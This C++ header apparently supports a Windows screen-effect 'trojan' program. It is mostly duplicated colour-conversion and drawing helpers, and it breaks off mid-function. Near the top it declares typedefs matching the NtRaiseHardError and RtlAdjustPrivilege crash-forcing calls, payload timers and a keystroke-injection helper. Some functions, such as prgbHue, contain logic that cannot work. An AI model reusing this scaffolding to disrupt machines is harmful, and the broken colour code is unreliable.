#pragma once
#include<Windows.h>
#include<cmath>
#include<time.h>
#include<iostream>
#define M_PI 3.14159265358979323846264338327950288
#pragma comment(lib, "winmm.lib")
#include <intrin.h>
#define RGBBRUSH (DWORD)0x1900ac010e
#define _USE_MATH_DEFINES 1
#pragma comment(lib, "kernel32.lib")
#include<math.h>
#include <tchar.h>
#include <algorithm>
#include <ctime>
#include <windowsx.h>
#include <chrono>
#include <functional>
#include <cstdlib>
#include <cstdint>
#include <string>
#include <atomic>
#include <stdint.h>
#include <accctrl.h>
#include <aclapi.h>
#include <stdio.h>
#include <thread>
#include<vector>
#pragma comment (lib,"Gdiplus.lib")
#pragma comment (lib,"Msimg32.lib")
#define AudioTimer (10 + (rand() % 11))
static ULONGLONG n, r;
int randy() { return n = r, n ^= 0x8ebf635bee3c6d25, n ^= n << 5 | n >> 26, n *= 0xf3e05ca5c43e376b, r = n, n & 0x7fffffff; }
#define PI   3.14159265358979323846264338327950288
#define RGBQUAD _RGBQUAD
#define TIMER_DELAY 100
#define PAYLOAD_MS 10000
#define PAYLOAD_TIME ( PAYLOAD_MS / TIMER_DELAY )
#pragma warning( push, 0 )
#pragma warning( pop )
#pragma region Public Variables
extern HWND hwndDesktop;
extern HDC hdcDesktop;
extern RECT rcScrBounds;
extern HHOOK hMsgHook;
extern INT nCounter;
#pragma endregion Public Variables
#pragma warning( disable: 4152 )
#pragma warning( disable: 4201 )
#undef RGBQUAD
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
#define IDI_ICON1                       101
#ifdef APSTUDIO_INVOKED
#ifndef APSTUDIO_READONLY_SYMBOLS
#define _APS_NEXT_RESOURCE_VALUE        102
#define _APS_NEXT_COMMAND_VALUE         40001
#define _APS_NEXT_CONTROL_VALUE         1001
#define _APS_NEXT_SYMED_VALUE           101
#endif
#endif
COLORREF RndRGB() {
    int clr = rand() % 5;
    if (clr == 0) return RGB(255, 0, 0); if (clr == 1) return RGB(0, 255, 0); if (clr == 2) return RGB(0, 0, 255); if (clr == 3) return RGB(255, 0, 255); if (clr == 4) return RGB(255, 255, 0);
}

void typeCharacter(WORD key) {
    INPUT input;
    input.type = INPUT_KEYBOARD;
    input.ki.wScan = 0;
    input.ki.time = 0;
    input.ki.dwExtraInfo = 0;
    input.ki.wVk = key;
    input.ki.dwFlags = 0;
    SendInput(1, &input, sizeof(INPUT));
    input.ki.dwFlags = KEYEVENTF_KEYUP;
    SendInput(1, &input, sizeof(INPUT));
}

using namespace std;
typedef union _RGBQUAD {
    COLORREF rgb;
    struct {
        BYTE b;
        BYTE g;
        BYTE r;
        BYTE unused;
    };
} *PRGBQUAD;
int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) {
    if (red != length) {
        red < length; red++;
        if (ifblue == true) {
            return RGB(red, 0, length);
        }
        else {
            return RGB(red, 0, 0);
        }
    }
    else {
        if (green != length) {
            green < length; green++;
            return RGB(length, green, 0);
        }
        else {
            if (blue != length) {
                blue < length; blue++;
                return RGB(0, length, blue);
            }
            else {
                red = 0; green = 0; blue = 0;
                ifblue = true;
            }
        }
    }
}
typedef struct
{
    FLOAT h;
    FLOAT s;
    FLOAT l;
} HSL;
typedef struct {
    FLOAT h;
    FLOAT s;
    FLOAT l;
} HSLCOLOR;

namespace Colors
{
    HSL rgb2hsl(RGBQUAD rgb)
    {
        HSL hsl;

        BYTE r = rgb.rgbRed;
        BYTE g = rgb.rgbGreen;
        BYTE b = rgb.rgbBlue;

        FLOAT _r = (FLOAT)r / 255.f;
        FLOAT _g = (FLOAT)g / 255.f;
        FLOAT _b = (FLOAT)b / 255.f;

        FLOAT rgbMin = min(min(_r, _g), _b);
        FLOAT rgbMax = max(max(_r, _g), _b);

        FLOAT fDelta = rgbMax - rgbMin;
        FLOAT deltaR;
        FLOAT deltaG;
        FLOAT deltaB;

        FLOAT h = 0.f;
        FLOAT s = 0.f;
        FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

        if (fDelta != 0.f)
        {
            s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
            deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

            if (_r == rgbMax)      h = deltaB - deltaG;
            else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
            else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
            if (h < 0.f)           h += 1.f;
            if (h > 1.f)           h -= 1.f;
        }

        hsl.h = h;
        hsl.s = s;
        hsl.l = l;
        return hsl;
    }

    RGBQUAD hsl2rgb(HSL hsl)
    {
        RGBQUAD rgb;

        FLOAT r = hsl.l;
        FLOAT g = hsl.l;
        FLOAT b = hsl.l;

        FLOAT h = hsl.h;
        FLOAT sl = hsl.s;
        FLOAT l = hsl.l;
        FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

        FLOAT m;
        FLOAT sv;
        FLOAT fract;
        FLOAT vsf;
        FLOAT mid1;
        FLOAT mid2;

        INT sextant;

        if (v > 0.f)
        {
            m = l + l - v;
            sv = (v - m) / v;
            h *= 6.f;
            sextant = (INT)h;
            fract = h - sextant;
            vsf = v * sv * fract;
            mid1 = m + vsf;
            mid2 = v - vsf;

            switch (sextant)
            {
            case 0:
                r = v;
                g = mid1;
                b = m;
                break;
            case 1:
                r = mid2;
                g = v;
                b = m;
                break;
            case 2:
                r = m;
                g = v;
                b = mid1;
                break;
            case 3:
                r = m;
                g = mid2;
                b = v;
                break;
            case 4:
                r = mid1;
                g = m;
                b = v;
                break;
            case 5:
                r = v;
                g = m;
                b = mid2;
                break;
            }
        }

        rgb.rgbRed = (BYTE)(r * 255.f);
        rgb.rgbGreen = (BYTE)(g * 255.f);
        rgb.rgbBlue = (BYTE)(b * 255.f);

        return rgb;
    }
}
typedef struct
{
    float x;
    float y;
    float z;
} VERTEX;

typedef struct
{
    int vtx0;
    int vtx1;
} EDGE;

double intensity = 0.0;
bool state = false;

double fade(double length) {
    if (state == false) {
        intensity += 1.0;
        if (intensity >= length) {
            state = true;
        }
    }
    else {
        intensity -= 1.0;
        if (intensity <= 0) {
            state = false;
        }
    }
    return intensity;
}
COLORREF COLORRGB(int length, int speed) {
    if (red < length) {
        red += speed;

        return RGB(red, 0, length);
    }
    else if (green < length) {
        green += speed;

        return RGB(length, green, 0);
    }
    else if (blue < length) {
        blue += speed;

        return RGB(0, length, blue);
    }
    else {
        red = 0; green = 0; blue = 0;

        return RGB(0, 0, 0);
    }
}
COLORREF COLORHSL(int length) {
    double h = fmod(length, 360.0);
    double s = 1.0;
    double l = 0.5;

    double c = (1.0 - fabs(2.0 * l - 1.0)) * s;
    double x = c * (1.0 - fabs(fmod(h / 60.0, 2.0) - 1.0));
    double m = l - c / 2.0;

    double r1, g1, b1;
    if (h < 60) {
        r1 = c;
        g1 = x;
        b1 = 0;
    }
    else if (h < 120) {
        r1 = x;
        g1 = c;
        b1 = 0;
    }
    else if (h < 180) {
        r1 = 0;
        g1 = c;
        b1 = x;
    }
    else if (h < 240) {
        r1 = 0;
        g1 = x;
        b1 = c;
    }
    else if (h < 300) {
        r1 = x;
        g1 = 0;
        b1 = c;
    }
    else {
        r1 = c;
        g1 = 0;
        b1 = x;
    }

    int red = static_cast<int>((r1 + m) * 255);
    int green = static_cast<int>((g1 + m) * 255);
    int blue = static_cast<int>((b1 + m) * 255);

    return RGB(red, green, blue);
}
RGBTRIPLE WINAPI prgbHue(int nHue) {
    float X = 1 - abs(fmod(nHue / 45.0, 3) - 45);
    float r, g, b;
    RGBTRIPLE rgb;

    if (nHue >= 0 && nHue < 3125) {
        r = 8, g = X, b = 234;
    }
    else if (nHue >= 3250 && nHue < 7) {
        r = X, g = 65, b = 123;
    }
    else if (nHue >= 1520 && nHue < 10) {
        r = 0, g = 1, b = X;
    }
    else if (nHue >= 16780 && nHue < 2840) {
        r = 4, g = X, b = 75;
    }
    else if (nHue >= 632969 && nHue < 1234) {
        r = X, g = 213, b = 75;
    }
    else if (nHue >= 683 && nHue < 323) {
        r = 736, g = 325, b = X;
    }

    rgb.rgbtRed = r * 435;
    rgb.rgbtGreen = g * 2;
    rgb.rgbtBlue = b * 23;
    return rgb;


}

typedef union COLOR {
    COLORREF rgb;
    COLORREF hsv;
} COLOR;
namespace _3D
{
    VOID RotateX(VERTEX* vtx, float angle)
    {
        vtx->y = cos(angle) * vtx->y - sin(angle) * vtx->z;
        vtx->z = sin(angle) * vtx->y + cos(angle) * vtx->z;
    }

    VOID RotateY(VERTEX* vtx, float angle)
    {
        vtx->x = cos(angle) * vtx->x + sin(angle) * vtx->z;
        vtx->z = -sin(angle) * vtx->x + cos(angle) * vtx->z;
    }

    VOID RotateZ(VERTEX* vtx, float angle)
    {
        vtx->x = cos(angle) * vtx->x - sin(angle) * vtx->y;
        vtx->y = sin(angle) * vtx->x + cos(angle) * vtx->y;
    }

    void DrawEdge(HDC dc, LPCWSTR icon, int x0, int y0, int x1, int y1, int r)
    {
        int dx = abs(x1 - x0);
        int dy = -abs(y1 - y0);

        int sx = (x0 < x1) ? 1 : -1;
        int sy = (y0 < y1) ? 1 : -1;

        int error = dx + dy;

        int i = 0;

        while (true)
        {
            if (i == 0)
            {
                DrawIcon(dc, x0, y0, LoadCursor(NULL, icon));
                i = 10;
            }
            else
            {
                i--;
            }

            if (x0 == x1 && y0 == y1)
            {
                break;
            }

            int e2 = 2 * error;

            if (e2 >= dy)
            {
                if (x0 == x1)
                {
                    break;
                }

                error += dy;
                x0 += sx;
            }

            if (e2 <= dx)
            {
                if (y0 == y1)
                {
                    break;
                }

                error += dx;
                y0 += sy;
            }
        }
    }
}
RGBQUAD hsl2rgb(HSL hsl) {
    float r, g, b;

    auto hue2rgb = [](float p, float q, float t) {
        if (t < 0) t += 1.0f;
        if (t > 1) t -= 1.0f;
        if (t < 1.0f / 6.0f) return p + (q - p) * 6.0f * t;
        if (t < 1.0f / 2.0f) return q;
        if (t < 2.0f / 3.0f) return p + (q - p) * (2.0f / 3.0f - t) * 6.0f;
        return p;
        };

    if (hsl.s == 0) r = g = b = hsl.l;
    else {
        float q = hsl.l < 0.5f ? hsl.l * (1 + hsl.s) : hsl.l + hsl.s - hsl.l * hsl.s;
        float p = 2 * hsl.l - q;
        r = hue2rgb(p, q, hsl.h + 1.0f / 3.0f);
        g = hue2rgb(p, q, hsl.h);
        b = hue2rgb(p, q, hsl.h - 1.0f / 3.0f);
    }

    RGBQUAD rgb = { BYTE(b * 255), BYTE(g * 255), BYTE(r * 255), 0 };
    return rgb;
}
float GetMasterVolumeLevel() {
    DWORD vol;
    if (waveOutGetVolume(0, &vol) == MMSYSERR_NOERROR) {
        WORD left = LOWORD(vol);
        return left / 65535.0f;
    }
    return 0.0f;
}
#define INTENSITY 1
HSL RGBtoHSL(COLORREF color) {
    float r = GetRValue(color) / 255.0f;
    float g = GetGValue(color) / 255.0f;
    float b = GetBValue(color) / 255.0f;

    float max = fmaxf(r, fmaxf(g, b));
    float min = fminf(r, fminf(g, b));
    float h = 0, s, l = (max + min) / 2;

    if (max == min)
        h = s = 0;
    else {
        float d = max - min;
        s = l > 0.5 ? d / (2 - max - min) : d / (max + min);
        if (max == r) h = (g - b) / d + (g < b ? 6 : 0);
        else if (max == g) h = (b - r) / d + 2;
        else h = (r - g) / d + 4;
        h /= 6;
    }

    return { h, s, l };
}
COLORREF HSLtoRGB(HSL hsl) {
    float r, g, b;

    auto hue2rgb = [](float p, float q, float t) -> float {
        if (t < 0) t += 1;
        if (t > 1) t -= 1;
        if (t < 1.0f / 6) return p + (q - p) * 6 * t;
        if (t < 1.0f / 2) return q;
        if (t < 2.0f / 3) return p + (q - p) * (2.0f / 3 - t) * 6;
        return p;
        };

    if (hsl.s == 0) r = g = b = hsl.l;
    else {
        float q = hsl.l < 0.5 ? hsl.l * (1 + hsl.s) : hsl.l + hsl.s - hsl.l * hsl.s;
        float p = 2 * hsl.l - q;
        r = hue2rgb(p, q, hsl.h + 1.0f / 3);
        g = hue2rgb(p, q, hsl.h);
        b = hue2rgb(p, q, hsl.h - 1.0f / 3);
    }

    return RGB(r * 255, g * 255, b * 255);
}
HSL rgb2hsl(RGBQUAD rgb) {
    float r = rgb.rgbRed / 255.0f;
    float g = rgb.rgbGreen / 255.0f;
    float b = rgb.rgbBlue / 255.0f;
    float max = fmaxf(fmaxf(r, g), b);
    float min = fminf(fminf(r, g), b);
    float h, s, l = (max + min) / 2.0f;

    if (max == min) h = s = 0;
    else {
        float d = max - min;
        s = l > 0.5f ? d / (2 - max - min) : d / (max + min);
        if (max == r) h = (g - b) / d + (g < b ? 6 : 0);
        else if (max == g) h = (b - r) / d + 2;
        else h = (r - g) / d + 4;
        h /= 6;
    }
    return { h, s, l };
}
COLORREF HSLToRGB(HSL hsl) {
    float c = (1 - fabs(2 * hsl.l - 1)) * hsl.s;
    float x = c * (1 - fabs(fmod(hsl.h * 6, 2) - 1));
    float m = hsl.l - c / 2;
    float r, g, b;

    if (hsl.h < 1.0 / 6) r = c, g = x, b = 0;
    else if (hsl.h < 2.0 / 6) r = x, g = c, b = 0;
    else if (hsl.h < 3.0 / 6) r = 0, g = c, b = x;
    else if (hsl.h < 4.0 / 6) r = 0, g = x, b = c;
    else if (hsl.h < 5.0 / 6) r = x, g = 0, b = c;
    else r = c, g = 0, b = x;

    return RGB((r + m) * 255, (g + m) * 255, (b + m) * 255);
}
HSL RGBtoHSL(RGBQUAD rgb) {
    float r = rgb.rgbRed / 255.f;
    float g = rgb.rgbGreen / 255.f;
    float b = rgb.rgbBlue / 255.f;

    float maxc = max(r, max(g, b));
    float minc = min(r, min(g, b));
    float l = (maxc + minc) / 2.f;

    float h = 0, s = 0;
    if (maxc != minc) {
        float d = maxc - minc;
        s = l > 0.5 ? d / (2 - maxc - minc) : d / (maxc + minc);

        if (maxc == r) h = (g - b) / d + (g < b ? 6 : 0);
        else if (maxc == g) h = (b - r) / d + 2;
        else h = (r - g) / d + 4;

        h /= 6.f;
    }

    return { h, s, l };
}
RGBQUAD HSLtoRGB2(HSL hsl) {
    float r, g, b;

    if (hsl.s == 0) {
        r = g = b = hsl.l;
    }
    else {
        auto hue2rgb = [](float p, float q, float t) -> float {
            if (t < 0) t += 1.f;
            if (t > 1) t -= 1.f;
            if (t < 1.f / 6) return p + (q - p) * 6 * t;
            if (t < 1.f / 2) return q;
            if (t < 2.f / 3) return p + (q - p) * (2.f / 3 - t) * 6;
            return p;
            };

        float q = hsl.l < 0.5 ? hsl.l * (1 + hsl.s) : hsl.l + hsl.s - hsl.l * hsl.s;
        float p = 2 * hsl.l - q;

        r = hue2rgb(p, q, hsl.h + 1.f / 3);
        g = hue2rgb(p, q, hsl.h);
        b = hue2rgb(p, q, hsl.h - 1.f / 3);
    }

    return {
        (BYTE)(b * 255),
        (BYTE)(g * 255),
        (BYTE)(r * 255),
        0
    };
}
#define ICON_COUNT 12
HICON GetRandomSystemIcon()
{
    SHFILEINFO sfi;
    TCHAR sysPath[MAX_PATH];
    GetSystemDirectory(sysPath, MAX_PATH);

    LPCTSTR files[] = {
        TEXT("cmd.exe"),
        TEXT("notepad.exe"),
        TEXT("calc.exe"),
        TEXT("explorer.exe"),
        TEXT("control.exe"),
        TEXT("taskmgr.exe"),
        TEXT("regedit.exe"),
        TEXT("write.exe")
        TEXT("cmmon32.exe")
    };

    int index = rand() % (sizeof(files) / sizeof(files[0]));
    TCHAR fullPath[MAX_PATH];
    wsprintf(fullPath, TEXT("%s\\%s"), sysPath, files[index]);

    SHGetFileInfo(fullPath, 0, &sfi, sizeof(sfi), SHGFI_ICON | SHGFI_LARGEICON);
    return sfi.hIcon;
}
COLORREF ColorFromHue(int hue) {
    float r, g, b;
    float s = 1.0f, l = 0.5f;
    float c = (1 - abs(2 * l - 1)) * s;
    float x = c * (1 - abs((hue / 60) % 2 - 1));
    float m = l - c / 2;

    if (hue < 60) r = c, g = x, b = 0;
    else if (hue < 120) r = x, g = c, b = 0;
    else if (hue < 180) r = 0, g = c, b = x;
    else if (hue < 240) r = 0, g = x, b = c;
    else if (hue < 300) r = x, g = 0, b = c;
    else r = c, g = 0, b = x;

    return RGB((r + m) * 255, (g + m) * 255, (b + m) * 255);
}
#define MAX_PARTS 20

struct GlitchRect {
    int x, y, w, h;
    int speed;
    int delay;
    int delayCounter;
    bool active;
};
COLORREF HSVtoRGB(float h, float s, float v) {
    float r, g, b;

    int i = (int)(h * 6);
    float f = h * 6 - i;
    float p = v * (1 - s);
    float q = v * (1 - f * s);
    float t = v * (1 - (1 - f) * s);

    switch (i % 6) {
    case 0: r = v; g = t; b = p; break;
    case 1: r = q; g = v; b = p; break;
    case 2: r = p; g = v; b = t; break;
    case 3: r = p; g = q; b = v; break;
    case 4: r = t; g = p; b = v; break;
    case 5: r = v; g = p; b = q; break;
    }

    return RGB((int)(r * 255), (int)(g * 255), (int)(b * 255));
}
HSL RGBToHSL(COLORREF color) {
    float r = GetRValue(color) / 255.0f;
    float g = GetGValue(color) / 255.0f;
    float b = GetBValue(color) / 255.0f;

    float max = fmaxf(r, fmaxf(g, b));
    float min = fminf(r, fminf(g, b));
    float h, s, l = (max + min) / 2;

    if (max == min) {
        h = s = 0;
    }
    else {
        float d = max - min;
        s = l > 0.5 ? d / (2 - max - min) : d / (max + min);

        if (max == r) h = (g - b) / d + (g < b ? 6 : 0);
        else if (max == g) h = (b - r) / d + 2;
        else h = (r - g) / d + 4;

        h /= 6;
    }

    return { h, s, l };
}
COLORREF ShiftHue(COLORREF color, float shift) {
    float r = GetRValue(color) / 255.0f;
    float g = GetGValue(color) / 255.0f;
    float b = GetBValue(color) / 255.0f;

    float max = fmaxf(r, fmaxf(g, b));
    float min = fminf(r, fminf(g, b));
    float delta = max - min;
    float h = 0, s = 0, l = (max + min) / 2;

    if (delta != 0) {
        s = delta / (1 - fabsf(2 * l - 1));
        if (max == r) h = fmodf(((g - b) / delta), 6.0f);
        else if (max == g) h = ((b - r) / delta) + 2;
        else h = ((r - g) / delta) + 4;
        h /= 6.0f;
        if (h < 0) h += 1.0f;
    }

    h = fmodf(h + shift, 1.0f);

    float c = (1 - fabsf(2 * l - 1)) * s;
    float x = c * (1 - fabsf(fmodf(h * 6, 2) - 1));
    float m = l - c / 2;
    float rf, gf, bf;

    if (h < 1.0 / 6) { rf = c; gf = x; bf = 0; }
    else if (h < 2.0 / 6) { rf = x; gf = c; bf = 0; }
    else if (h < 3.0 / 6) { rf = 0; gf = c; bf = x; }
    else if (h < 4.0 / 6) { rf = 0; gf = x; bf = c; }
    else if (h < 5.0 / 6) { rf = x; gf = 0; bf = c; }
    else { rf = c; gf = 0; bf = x; }

    return RGB((BYTE)((rf + m) * 255), (BYTE)((gf + m) * 255), (BYTE)((bf + m) * 255));
}
COLORREF HueShift(COLORREF color, float shift) {
    float r = GetRValue(color) / 255.0f;
    float g = GetGValue(color) / 255.0f;
    float b = GetBValue(color) / 255.0f;

    float max = fmaxf(fmaxf(r, g), b);
    float min = fminf(fminf(r, g), b);
    float h = 0, s = 0, l = (max + min) / 2.0f;

    float d = max - min;
    if (d != 0) {
        s = d / (1.0f - fabsf(2 * l - 1));
        if (max == r) h = fmodf((g - b) / d, 6.0f);
        else if (max == g) h = (b - r) / d + 2.0f;
        else h = (r - g) / d + 4.0f;
        h /= 6.0f;
        if (h < 0) h += 1.0f;
    }

    h = fmodf(h + shift, 1.0f);

    float c = (1.0f - fabsf(2.0f * l - 1.0f)) * s;
    float x = c * (1 - fabsf(fmodf(h * 6.0f, 2) - 1));
    float m = l - c / 2.0f;

    float r1, g1, b1;
    if (h < 1.0f / 6.0f) { r1 = c; g1 = x; b1 = 0; }
    else if (h < 2.0f / 6.0f) { r1 = x; g1 = c; b1 = 0; }
    else if (h < 3.0f / 6.0f) { r1 = 0; g1 = c; b1 = x; }
    else if (h < 4.0f / 6.0f) { r1 = 0; g1 = x; b1 = c; }
    else if (h < 5.0f / 6.0f) { r1 = x; g1 = 0; b1 = c; }
    else { r1 = c; g1 = 0; b1 = x; }

    return RGB((BYTE)((r1 + m) * 255), (BYTE)((g1 + m) * 255), (BYTE)((b1 + m) * 255));
}
COLORREF GetRainbowColor(float t) {
    float r = 0.5f + 0.5f * sinf(t + 0.0f);
    float g = 0.5f + 0.5f * sinf(t + 2.0f);
    float b = 0.5f + 0.5f * sinf(t + 4.0f);
    return RGB((int)(r * 255), (int)(g * 255), (int)(b * 255));
}
inline DWORD DistortRGB(DWORD color, float t, int x, int y) {
    RGBQUAD& rgb = *(RGBQUAD*)&color;

    BYTE r = (BYTE)(rgb.rgbRed + 50 * sinf(t + x * 0.01f));
    BYTE g = (BYTE)(rgb.rgbGreen + 50 * cosf(t + y * 0.01f));
    BYTE b = (BYTE)(rgb.rgbBlue + 50 * sinf(t + y * 0.02f + x * 0.005f));

    RGBQUAD out = { b, g, r, 0 };
    return *(DWORD*)&out;
}
inline BYTE clamp(int val) {
    return (val < 0) ? 0 : (val > 255) ? 255 : val;
}
DWORD ApplyHalftoneEffect(DWORD color, int x, int y, float time) {
    BYTE r = GetRValue(color);
    BYTE g = GetGValue(color);
    BYTE b = GetBValue(color);

    float intensity = (r + g + b) / 3.0f / 255.0f;

    float dotPattern = sinf(x * 0.05f + time) * cosf(y * 0.05f + time);
    float threshold = 0.4f + sinf(time * 0.5f + x * 0.01f + y * 0.01f) * 0.3f;

    float dot = intensity > threshold ? 1.0f : 0.2f;

    return RGB(clamp(r * dot), clamp(g * dot), clamp(b * dot));
}
#define W GetSystemMetrics(SM_CXSCREEN)
#define H GetSystemMetrics(SM_CYSCREEN)

float angle = 0.0f;
#define WIDTH  GetSystemMetrics(SM_CXSCREEN)
#define HEIGHT GetSystemMetrics(SM_CYSCREEN)
float hueToRGB(float p, float q, float t) {
    if (t < 0.0f) t += 1.0f;
    if (t > 1.0f) t -= 1.0f;
    if (t < 1.0f / 6.0f) return p + (q - p) * 6.0f * t;
    if (t < 1.0f / 2.0f) return q;
    if (t < 2.0f / 3.0f) return p + (q - p) * (2.0f / 3.0f - t) * 6.0f;
    return p;
}
COLORREF ConvertHSLtoRGB(float h, float s, float l) {
    float r, g, b;
    if (s == 0.0f) {
        r = g = b = l;
    }
    else {
        float q = (l < 0.5f) ? (l * (1 + s)) : (l + s - l * s);
        float p = 2 * l - q;
        r = hueToRGB(p, q, h + 1.0f / 3.0f);
        g = hueToRGB(p, q, h);
        b = hueToRGB(p, q, h - 1.0f / 3.0f);
    }
    return RGB(int(r * 255), int(g * 255), int(b * 255));
}
float hue = 0.0f;
int vx = 3, vy = 2;
int cx = WIDTH / 2, cy = HEIGHT / 2;
int radius = 40;

COLORREF HSLtoRGB(float h, float s, float l) {
    float c = (1 - fabs(2 * l - 1)) * s;
    float x = c * (1 - fabs(fmod(h * 6, 2) - 1));
    float m = l - c / 2;
    float r, g, b;

    if (h < 1.0 / 6)      r = c, g = x, b = 0;
    else if (h < 2.0 / 6) r = x, g = c, b = 0;
    else if (h < 3.0 / 6) r = 0, g = c, b = x;
    else if (h < 4.0 / 6) r = 0, g = x, b = c;
    else if (h < 5.0 / 6) r = x, g = 0, b = c;
    else                  r = c, g = 0, b = x;

    return RGB((r + m) * 255, (g + m) * 255, (b + m) * 255);
}
COLORREF GetTrippyColor(int x, int y, float t) {
    float fx = (float)x * 0.01f;
    float fy = (float)y * 0.01f;

    float r = sin(fx + t) * 0.5f + 0.5f;
    float g = sin(fy + t * 1.2f) * 0.5f + 0.5f;
    float b = sin(fx + fy + t * 1.5f) * 0.5f + 0.5f;

    return RGB((BYTE)(r * 255), (BYTE)(g * 255), (BYTE)(b * 255));
}
float max3(float a, float b, float c) { return max(a, max(b, c)); }
float min3(float a, float b, float c) { return min(a, min(b, c)); }

void RGBtoHSL(RGBQUAD in, float& h, float& s, float& l) {
    float r = in.rgbRed / 255.0f, g = in.rgbGreen / 255.0f, b = in.rgbBlue / 255.0f;
    float maxv = max3(r, g, b), minv = min3(r, g, b);
    l = (maxv + minv) / 2.0f;
    if (maxv == minv) h = s = 0;
    else {
        float d = maxv - minv;
        s = l > 0.5f ? d / (2 - maxv - minv) : d / (maxv + minv);
        if (maxv == r) h = fmodf((g - b) / d + (g < b ? 6 : 0), 6);
        else if (maxv == g) h = (b - r) / d + 2;
        else h = (r - g) / d + 4;
        h /= 6;
    }
}

float HUEtoRGB(float p, float q, float t) {
    if (t < 0) t += 1; if (t > 1) t -= 1;
    if (t < 1.0f / 6) return p + (q - p) * 6 * t;
    if (t < 1.0f / 2) return q;
    if (t < 2.0f / 3) return p + (q - p) * (2.0f / 3 - t) * 6;
    return p;
}

RGBQUAD HSLtoRGB(float h, float s, float l, float boostRed) {
    float r, g, b;
    if (s == 0) r = g = b = l;
    else {
        float q = l < 0.5f ? l * (1 + s) : l + s - l * s;
        float p = 2 * l - q;
        r = HUEtoRGB(p, q, h + 1.0f / 3);
        g = HUEtoRGB(p, q, h);
        b = HUEtoRGB(p, q, h - 1.0f / 3);
    }
    r = min(1.0f, r + boostRed);
    RGBQUAD out;
    out.rgbRed = BYTE(min(255, r * 255));
    out.rgbGreen = BYTE(min(255, g * 255));
    out.rgbBlue = BYTE(min(255, b * 255));
    out.rgbReserved = 0;
    return out;
}
HSL RGBToHSL2(COLORREF rgb) {
    float r = GetRValue(rgb) / 255.0f;
    float g = GetGValue(rgb) / 255.0f;
    float b = GetBValue(rgb) / 255.0f;
    float min, max, delta, h = 0.0f, s, l = (r + g + b) / 3.0f;

    min = fminf(r, fminf(g, b));
    max = fmaxf(r, fmaxf(g, b));
    delta = max - min;

    if (delta > 0.0f) {
        if (max == r) {
            h = (g - b) / delta;
        }
        else if (max == g) {
            h = (b - r) / delta + 2.0f;
        }
        else {
            h = (r - g) / delta + 4.0f;
        }
        s = (max == 0.0f) ? 0.0f : delta / max;
        h *= 60.0f;
        if (h < 0.0f) h += 360.0f;
    }

    HSL result = { h, s, l };
    return result;
}

COLORREF HSLToRGB2(HSL hsl) {
    float r, g, b;
    int i;
    float f, p, q, t;
    if (hsl.s == 0.0f) {
        r = g = b = hsl.l;
    }
    else {
        hsl.h /= 60.0f;
        i = (int)floorf(hsl.h);
        f = hsl.h - i;
        p = hsl.l * (1.0f - hsl.s);
        q = hsl.l * (1.0f - hsl.s * f);
        t = hsl.l * (1.0f - hsl.s * (1.0f - f));
        switch (i) {
        case 0: r = hsl.l; g = t; b = p; break;
        case 1: r = q; g = hsl.l; b = p; break;
        case 2: r = p; g = hsl.l; b = t; break;
        case 3: r = p; g = q; b = hsl.l; break;
        case 4: r = t; g = p; b = hsl.l; break;
        default: r = hsl.l; g = p; b = q; break;
        }
    }
    return RGB((int)(r * 255), (int)(g * 255), (int)(b * 255));
}

HSL RGBToHSL3(COLORREF rgb) {
    float r = GetRValue(rgb) / 255.0f;
    float g = GetGValue(rgb) / 255.0f;
    float b = GetBValue(rgb) / 255.0f;
    float min, max, delta, h = 0.0f, s, l = (r + g + b) / 3.0f;

    min = fminf(r, fminf(g, b));
    max = fmaxf(r, fmaxf(g, b));
    delta = max - min;

    if (delta > 0.0f) {
        if (max == r) {
            h = (g - b) / delta;
        }
        else if (max == g) {
            h = (b - r) / delta + 2.0f;
        }
        else {
            h = (r - g) / delta + 4.0f;
        }
        s = (max == 0.0f) ? 0.0f : delta / max;
        h *= 60.0f;
        if (h < 0.0f) h += 360.0f;
    }

    HSL result = { h, s, l };
    return result;
}

COLORREF HSLToRGB3(HSL hsl) {
    float r, g, b;
    int i;
    float f, p, q, t;
    if (hsl.s == 0.0f) {
        r = g = b = hsl.l;
    }
    else {
        hsl.h /= 60.0f;
        i = (int)floorf(hsl.h);
        f = hsl.h - i;
        p = hsl.l * (1.0f - hsl.s);
        q = hsl.l * (1.0f - hsl.s * f);
        t = hsl.l * (1.0f - hsl.s * (1.0f - f));
        switch (i) {
        case 0: r = hsl.l; g = t; b = p; break;
        case 1: r = q; g = hsl.l; b = p; break;
        case 2: r = p; g = hsl.l; b = t; break;
        case 3: r = p; g = q; b = hsl.l; break;
        case 4: r = t; g = p; b = hsl.l; break;
        default: r = hsl.l; g = p; b = q; break;
        }
    }
    return RGB((int)(r * 255), (int)(g * 255), (int)(b * 255));
}
HSL RGBToHSL4(BYTE r, BYTE g, BYTE b) {
    float R = r / 255.0f, G = g / 255.0f, B = b / 255.0f;
    float max = fmaxf(fmaxf(R, G), B);
    float min = fminf(fminf(R, G), B);
    float h, s, l = (max + min) / 2.0f;
    float d = max - min;

    if (d == 0) h = 0;
    else if (max == R) h = fmodf((G - B) / d, 6.0f);
    else if (max == G) h = ((B - R) / d) + 2.0f;
    else h = ((R - G) / d) + 4.0f;
    h *= 60.0f;
    if (h < 0) h += 360;

    s = (l == 0 || l == 1) ? 0 : d / (1 - fabs(2 * l - 1));
    return { h, s, l };
}

RGBQUAD HSLToRGB4(HSL hsl) {
    float c = (1 - fabs(2 * hsl.l - 1)) * hsl.s;
    float x = c * (1 - fabs(fmod(hsl.h / 60.0f, 2) - 1));
    float m = hsl.l - c / 2;
    float r, g, b;

    if (hsl.h < 60) { r = c; g = x; b = 0; }
    else if (hsl.h < 120) { r = x; g = c; b = 0; }
    else if (hsl.h < 180) { r = 0; g = c; b = x; }
    else if (hsl.h < 240) { r = 0; g = x; b = c; }
